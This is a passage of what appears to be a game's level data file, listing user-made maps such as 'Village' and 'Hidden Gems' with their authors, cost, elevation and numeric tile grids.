1,1,11,11,11,1,0,0,0,0,0,0,0,0,0,0,1,5,5,5,1,1,126,126,126,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,90,10,5,5,3,10,10,90,10,10,10,18,18,18,18,18,18,18,18,1,93,10,5,134,5,10,10,10,10,125,10,18,90,18,90,18,90,18,2,1,90,10,5,5,3,10,10,90,10,10,10,18,18,18,18,18,18,18,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Ice and Fire",author="ZpLit",id="#1663155720",direction="forward",cost=327,elevation=0,map=[0,0,0,0,0,0,0,0,6,2,2,6,0,0,6,6,6,6,6,6,0,0,0,0,0,0,0,0,6,6,6,6,6,6,6,12,12,12,12,6,0,0,0,0,0,0,0,0,6,6,6,6,6,6,6,12,97,46,12,6,0,0,0,0,0,0,0,0,6,6,6,6,0,0,6,12,46,93,12,6,0,0,0,0,0,0,0,0,6,6,6,6,0,0,6,46,46,46,12,6,0,0,0,0,0,0,0,0,6,6,6,6,0,0,6,12,12,12,12,6,0,0,0,0,0,0,0,0,6,6,6,6,0,0,6,6,6,6,6,6,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,77,77,77,77,77,3,77,77,6,6,6,6,77,77,77,77,77,77,77,77,22,24,20,22,22,22,22,24,106,106,106,106,22,24,22,22,22,20,22,24,22,22,22,24,22,22,22,22,96,96,96,96,22,0,0,0,0,0,0,0,22,20,22,22,20,22,24,22,106,106,106,90,22,0,0,0,0,0,0,0,24,22,24,22,22,20,22,20,106,106,106,106,22,0,0,0,0,0,0,0,22,20,22,20,22,22,22,22,90,106,106,106,22,0,0,0,0,0,0,0,22,24,20,22,24,22,20,22,106,106,106,90,22,0,0,0,0,0,0,0,22,22,22,22,22,22,22,24,95,95,95,95,22,0,0,0,0,0,0,0,24,24,22,24,24,22,24,24,106,106,106,106,24,24,24,24,24,24,24,24,67,67,67,67,67,67,67,67,6,6,6,6,67,67,67,67,67,67,67,67,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,2,2,88,0,0,0,0,0,0,0,0]});
maps.push({name="bind mwheeldown jump",author="Tenzist",id="#1663156656",direction="forward",cost=106,elevation=8,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,127,127,127,127,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,142,142,142,142,142,142,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,38,38,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,127,127,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,42,42,42,42,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,42,42,42,42,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,42,42,42,42,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,142,142,142,142,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,42,42,42,42,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Snake",author="Tenzist",id="#1663158134",direction="left",cost=99,elevation=-5,map=[0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,3,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,3,54,54,53,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,53,53,52,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,52,52,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,51,51,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,52,51,51,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,52,52,0,0,0,0,0,0,0,0,49,0,0,0,0,0,0,0,0,0,53,53,0,0,0,0,0,0,0,49,65,49,0,0,0,0,0,0,0,0,53,53,54,0,0,0,0,0,0,2,49,49,50,50,0,0,0,0,0,0,0,54,54,55,0,0,0,0,0,2,49,49,50,51,51,0,0,0,0,0,0,0,55,55,0,0,0,0,0,49,65,49,0,51,52,52,0,0,0,0,0,0,56,56,3,42,0,0,0,0,49,0,0,0,52,52,0,0,0,0,0,57,56,56,3,42,0,0,0,0,0,0,0,0,53,53,0,0,0,0,58,57,57,0,0,0,0,0,0,0,0,0,0,0,53,54,54,0,0,57,58,58,0,0,0,0,0,0,0,0,0,0,0,0,0,54,55,55,56,57,57,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,55,55,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Village",author="sivi",id="#1663162308",direction="forward",cost=401,elevation=0,map=[19,19,19,19,19,19,19,19,19,2,2,19,19,19,19,0,0,0,0,0,19,6,6,6,6,6,6,6,6,5,5,6,6,6,19,0,0,0,0,0,19,6,12,12,12,12,12,12,6,5,5,6,90,6,19,0,0,0,0,0,19,6,134,93,46,94,12,46,6,5,5,6,6,6,19,0,0,0,0,0,19,6,12,93,46,46,95,46,6,5,5,6,90,6,19,0,0,0,0,0,19,6,134,93,46,94,12,46,6,5,5,6,6,6,19,19,19,19,19,19,19,6,12,12,12,12,12,12,6,5,5,5,5,6,6,6,6,6,94,134,19,6,6,6,6,6,6,6,6,5,5,5,5,6,90,6,6,6,90,19,19,94,6,6,6,6,6,6,6,6,6,5,5,6,6,6,6,6,94,19,19,12,134,12,134,12,6,90,88,90,6,5,5,6,12,12,12,12,12,19,19,12,88,88,88,12,6,65,65,65,6,5,5,6,46,12,46,93,134,19,19,12,46,46,46,12,88,65,65,65,6,5,5,6,46,95,46,93,12,19,19,12,12,95,12,12,6,65,65,65,6,5,5,6,46,12,46,93,134,19,19,12,46,46,46,12,6,90,88,90,6,5,5,6,12,12,12,12,12,19,19,6,6,6,6,6,6,6,6,6,6,5,5,6,6,6,6,6,94,19,19,6,5,5,5,5,5,5,5,5,5,5,5,6,90,6,6,6,6,19,19,6,5,5,5,5,5,5,5,5,5,5,5,6,6,6,19,19,19,19,19,6,5,5,6,6,6,6,6,6,6,6,6,6,6,6,19,0,0,0,19,6,5,5,6,90,6,6,90,6,6,90,6,6,90,6,19,0,0,0,19,19,2,2,19,19,19,19,19,19,19,19,19,19,19,19,19,0,0,0]});
maps.push({name="Squat",author="tilgep",id="#1663169481",direction="forward",cost=123,elevation=0,map=[0,0,0,0,0,2,2,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,89,14,0,75,0,75,0,0,0,0,0,0,0,0,0,0,0,0,14,1,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,142,142,0,0,0,75,0,0,0,0,0,0,0,0,0,0,0,1,1,1,142,142,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,1,95,95,0,0,0,75,0,0,0,0,0,0,0,0,0,1,1,0,0,1,142,142,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,14,14,142,142,1,1,1,75,0,0,0,0,0,0,0,0,1,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,75,0,75,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,89,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Hidden Gems",author="tilgep",id="#1663172787",direction="forward",cost=194,elevation=1,map=[0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,14,14,14,1,1,114,0,0,0,0,0,0,14,14,14,14,14,129,14,0,14,14,142,142,142,142,0,0,0,0,0,0,14,14,14,14,14,14,14,0,14,14,0,1,1,142,1,0,0,0,0,0,0,14,14,89,14,0,0,0,0,1,19,1,1,142,114,94,0,0,0,0,0,14,14,14,14,0,0,0,0,0,85,1,1,142,114,94,0,0,0,0,0,89,14,14,14,0,0,0,0,0,19,0,1,142,1,1,0,0,0,0,96,14,14,14,96,0,0,0,0,0,19,0,1,142,1,1,0,0,0,0,0,96,96,96,0,0,97,19,19,19,19,0,1,142,114,93,0,0,0,0,55,0,0,0,55,0,0,1,1,1,1,1,1,142,114,93,0,0,0,0,55,55,55,55,55,0,127,10,0,14,142,142,142,142,1,0,0,0,0,93,41,55,55,55,55,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,0,55,55,55,55,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,89,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,2,2,15,0,0,0,0,0,0,0,0]});
maps.push({name="Wheres The Entrance",author="tilgep",id="#1663174972",direction="forward",cost=224,elevation=0,map=[0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,1,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,114,114,114,114,114,114,1,1,1,1,1,1,0,0,1,94,114,94,114,1,114,54,144,54,54,114,1,114,93,114,93,1,0,0,1,114,94,114,3,120,54,54,54,54,54,54,120,3,114,93,114,1,0,0,1,94,114,94,114,1,114,54,54,144,54,114,1,114,93,114,93,1,0,0,1,114,94,114,3,120,54,54,54,54,54,54,120,3,114,93,114,1,0,0,1,94,114,94,114,1,114,54,144,54,54,114,1,114,93,114,93,1,0,0,1,114,94,114,3,120,54,54,54,54,54,54,120,3,114,93,114,1,0,0,1,94,114,94,114,1,114,54,54,144,54,114,1,114,93,114,93,1,0,0,1,1,1,1,1,1,114,114,114,114,114,114,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,14,1,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0]});
maps.push({name="Going Down",author="sivi",id="#1663176146",direction="forward",cost=109,elevation=-10,map=[0,0,0,0,0,0,0,0,24,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,96,96,24,24,18,0,0,0,0,0,0,0,0,0,0,0,0,0,134,90,115,115,90,134,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,97,115,115,88,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,93,115,115,115,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,90,115,115,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,24,24,98,98,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,134,90,110,110,90,134,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,88,110,110,99,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,110,110,110,93,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,110,110,90,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="LITERALLY CHEESE",author="iProbie",id="#1663181501",direction="forward",cost=203,elevation=0,map=[0,25,2,2,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,3,35,35,35,35,35,35,35,35,35,35,0,0,0,0,0,0,0,0,0,3,35,35,37,37,37,37,37,37,37,35,0,0,0,0,0,0,0,0,0,0,35,35,37,0,37,0,37,37,37,35,0,0,0,0,0,0,0,0,0,35,35,35,37,37,37,37,37,0,37,35,0,0,0,0,0,0,0,0,0,35,37,35,37,37,37,37,37,37,37,35,0,0,0,0,0,0,0,0,0,35,37,35,37,0,37,37,37,37,35,35,0,0,0,0,0,0,0,0,35,35,37,35,37,37,37,37,37,37,35,0,0,0,0,0,0,0,0,0,35,37,37,35,37,37,37,37,0,37,35,0,0,0,0,0,0,0,0,35,35,37,37,35,37,37,0,37,37,37,35,0,0,0,0,0,0,0,0,35,37,37,37,35,37,37,37,37,37,37,35,0,0,0,0,0,0,0,35,35,37,0,37,35,37,37,37,37,37,35,35,0,0,0,0,0,0,0,35,35,37,37,37,35,37,37,37,37,37,35,0,0,0,0,0,0,0,0,35,37,37,37,37,35,37,37,0,37,37,35,0,0,0,0,0,0,0,0,35,37,37,0,37,35,37,37,37,0,37,35,0,0,0,0,0,0,0,0,35,35,37,37,37,35,37,37,37,37,37,35,3,0,0,0,0,0,0,0,0,35,35,35,35,35,35,35,35,35,35,35,3,25,25,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,2,2,25]});
maps.push({name="Shortcut v3",author="sivi",id="#1663190262",direction="left",cost=333,elevation=0,map=[0,0,0,0,24,2,2,24,0,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,24,108,108,24,0,24,90,132,132,132,90,24,0,0,0,0,0,0,0,0,24,108,108,24,0,24,132,105,105,105,132,24,0,0,0,0,0,0,0,0,24,108,108,24,0,24,132,105,105,105,132,24,0,0,0,0,0,0,0,0,24,108,108,24,0,24,90,105,105,105,90,24,24,24,24,24,0,0,0,0,24,108,108,24,0,24,132,105,105,105,105,105,105,105,90,24,0,0,0,0,24,108,108,24,0,24,132,105,105,105,105,105,105,105,105,24,0,0,0,24,24,142,142,24,24,24,90,94,94,90,105,105,105,105,105,24,0,0,0,24,5,131,131,5,24,24,139,24,24,24,24,24,105,105,105,24,24,139,24,24,24,142,142,24,24,0,0,0,0,0,0,24,90,105,90,24,24,90,88,88,90,108,108,24,0,0,0,0,0,0,0,24,105,105,105,24,2,108,108,108,108,108,93,24,0,0,0,0,0,0,0,24,105,105,105,24,2,108,108,108,108,108,93,24,0,0,0,0,0,0,0,24,105,105,105,24,24,90,108,108,108,108,90,139,0,0,0,0,0,0,0,24,105,105,105,24,24,24,24,107,107,107,24,24,0,0,0,0,0,0,0,24,90,105,90,24,0,0,24,106,106,106,24,24,24,24,24,24,24,24,24,24,105,105,105,24,0,0,24,105,105,105,105,105,90,105,105,105,105,90,105,105,105,105,105,24,0,0,24,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,105,24,0,0,24,90,105,105,105,105,90,105,105,105,105,90,105,105,105,105,90,24,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24]});
maps.push({name="kinda gusty",author="chinny",id="#1663197755",direction="forward",cost=55,elevation=0,map=[0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0]});
maps.push({name="dont stop coming",author="chinny",id="#1663199170",direction="forward",cost=109,elevation=-1,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,21,19,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,21,21,20,19,132,132,19,20,21,21,0,0,0,0,0,0,0,0,0,22,22,21,20,0,19,19,0,20,21,22,22,0,0,0,0,0,0,0,0,23,22,0,0,0,127,127,0,0,0,22,23,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,23,23,0,0,0,0,0,0,0,0,23,23,0,0,0,19,19,0,0,0,23,23,0,0,0,0,0,0,0,0,23,23,0,1,19,131,131,19,1,0,23,23,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,39,94,93,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,18,18,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Climb Strafes",author="ZpLit",id="#1663199283",direction="left",cost=217,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,2,2,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,100,22,21,20,19,19,20,20,0,0,6,6,6,6,0,0,0,0,0,0,22,22,21,20,19,19,20,21,21,0,6,6,6,6,0,0,0,0,0,0,22,22,0,0,0,0,1,21,22,22,6,6,6,6,0,0,0,0,0,0,23,23,0,0,0,0,0,1,22,22,6,6,6,6,0,0,0,0,1,1,24,24,1,1,0,0,0,0,1,26,0,0,0,0,0,100,18,18,18,118,58,58,118,19,20,21,22,23,26,0,141,141,141,141,0,18,0,0,1,1,24,24,1,1,0,0,0,0,1,26,1,1,1,24,0,18,0,0,0,1,23,23,0,0,0,0,0,1,23,23,0,0,0,23,1,118,1,1,1,1,22,22,0,0,0,0,1,22,23,23,0,0,0,22,1,52,52,113,54,115,56,100,1,0,0,0,21,22,22,22,0,0,0,21,1,52,52,113,54,115,56,56,1,0,0,20,21,21,0,21,0,0,0,20,88,6,6,1,1,1,56,56,1,0,19,20,20,0,0,20,0,0,0,19,2,6,6,23,23,23,57,57,117,18,19,19,0,0,0,19,0,0,0,18,2,6,6,23,23,23,57,57,117,18,18,0,0,0,0,18,0,0,0,17,88,6,6,1,1,1,1,1,1,0,0,0,0,0,0,17,91,91,91,87]});
maps.push({name="o",author="chinny",id="#1663199554",direction="forward",cost=116,elevation=0,map=[0,0,0,0,0,0,0,54,2,2,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,54,54,54,54,0,0,0,0,0,0,0,0,0,0,0,0,54,54,54,54,54,54,54,54,54,54,0,0,0,0,0,0,0,0,0,54,54,54,54,0,0,0,0,54,54,54,54,0,0,0,0,0,0,0,54,54,54,0,0,0,0,0,0,0,0,54,54,54,0,0,0,0,0,54,54,54,0,0,0,0,0,0,0,0,0,0,54,54,54,0,0,0,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,54,54,0,0,0,54,54,54,0,0,0,0,0,0,0,0,0,0,0,0,54,54,54,0,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,0,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,0,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,0,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,54,0,0,54,54,54,0,0,0,0,0,0,0,0,0,0,0,0,54,54,54,0,0,0,54,54,0,0,0,0,0,0,0,0,0,0,0,0,54,54,0,0,0,0,54,54,54,0,0,0,0,0,0,0,0,0,0,54,54,54,0,0,0,0,0,54,54,54,0,0,0,0,0,0,0,0,54,54,54,0,0,0,0,0,0,0,54,54,54,54,0,0,0,0,54,54,54,54,0,0,0,0,0,0,0,0,0,54,54,54,54,54,54,54,54,54,54,0,0,0,0,0,0,0,0,0,0,0,0,54,54,54,54,54,54,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,54,2,2,54,0,0,0,0,0,0,0,0,0]});
maps.push({name="help im lost",author="chinny",id="#1663199818",direction="forward",cost=376,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,144,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,144,144,144,144,0,0,0,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,144,144,144,144,14,14,14,14,14,0,0,0,0,0,0,0,0,14,14,14,14,144,144,14,14,14,144,14,14,0,0,0,0,0,0,0,0,144,14,14,14,144,144,14,14,144,144,14,14,0,0,0,0,0,0,0,0,0,144,14,14,14,14,14,14,144,144,14,14,0,0,0,0,0,0,0,0,0,144,14,14,14,14,14,14,144,144,14,14,144,0,0,0,0,0,0,0,0,0,144,144,144,144,144,144,144,144,14,14,144,0,0,0,0,0,0,0,0,0,0,144,144,144,144,144,144,14,14,14,144,144,0,0,0,0,0,0,0,0,0,0,144,144,144,14,14,14,14,144,144,144,144,0,0,0,0,0,0,0,0,0,0,144,14,14,14,14,144,144,144,14,14,14,0,0,0,0,0,0,0,0,0,144,14,14,144,144,144,144,14,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,144,144,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,144,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,144,144,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,144,144,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,144,144,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Watermelon",author="TF2 Pencil",id="#1663216342",direction="forward",cost=204,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,125,125,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,125,125,19,19,0,0,0,0,0,0,0,0,0,0,0,0,19,19,119,119,0,125,125,19,19,0,0,0,0,0,0,0,0,0,0,0,19,19,119,119,119,0,125,125,19,0,0,0,0,0,0,0,0,0,0,0,19,19,119,1,119,119,0,125,19,0,0,0,0,0,0,0,0,0,0,0,19,19,119,119,119,119,0,125,19,19,0,0,0,0,0,0,0,0,0,0,19,19,119,1,119,1,119,0,125,19,0,0,0,0,0,0,19,19,19,19,19,19,119,119,119,119,119,0,125,19,19,19,0,0,0,0,100,19,19,19,19,19,119,119,119,119,119,0,125,19,19,100,0,0,0,0,0,0,0,0,19,19,119,1,119,1,119,0,125,19,0,0,0,0,0,0,0,0,0,0,19,19,119,119,119,119,0,125,19,19,0,0,0,0,0,0,0,0,0,0,19,19,119,1,119,119,0,125,19,0,0,0,0,0,0,0,0,0,0,0,19,19,119,119,119,0,125,125,19,0,0,0,0,0,0,0,0,0,0,0,19,19,119,119,0,125,125,19,19,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,125,125,19,19,0,0,0,0,0,0,0,0,0,0,0,0,19,19,125,125,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Apple",author="TF2 Pencil",id="#1663216370",direction="forward",cost=230,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,118,118,118,118,118,0,0,0,0,0,0,0,0,0,0,0,0,0,0,118,118,118,118,118,118,118,118,0,0,0,0,0,0,0,0,0,0,0,118,118,118,118,118,118,118,118,118,118,0,0,0,0,0,0,0,0,0,118,118,118,118,118,118,118,118,118,118,118,118,0,0,0,0,0,0,0,0,118,118,118,118,118,118,118,118,118,118,118,118,118,0,0,0,0,0,0,0,118,118,118,118,118,118,118,118,118,118,118,118,118,0,0,0,0,0,0,0,0,118,118,118,118,118,118,118,118,118,118,118,118,0,0,0,0,91,91,91,91,118,118,118,118,118,118,118,118,118,118,118,118,0,38,0,0,91,91,91,91,118,118,118,118,118,118,118,118,118,118,118,118,0,100,0,0,0,125,125,125,118,118,118,118,118,118,118,118,118,118,118,118,0,0,0,0,125,125,125,118,118,118,118,118,118,118,118,118,118,118,118,118,0,0,0,0,125,125,125,118,118,118,118,118,118,118,118,118,118,118,118,118,0,0,0,0,125,125,0,118,118,118,118,118,118,118,118,118,118,118,118,0,0,0,0,0,0,0,0,0,118,118,118,118,118,118,118,118,118,118,0,0,0,0,0,0,0,0,0,0,0,118,118,118,118,118,118,118,118,0,0,0,0,0,0,0,0,0,0,0,0,0,118,118,118,118,118,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0]});
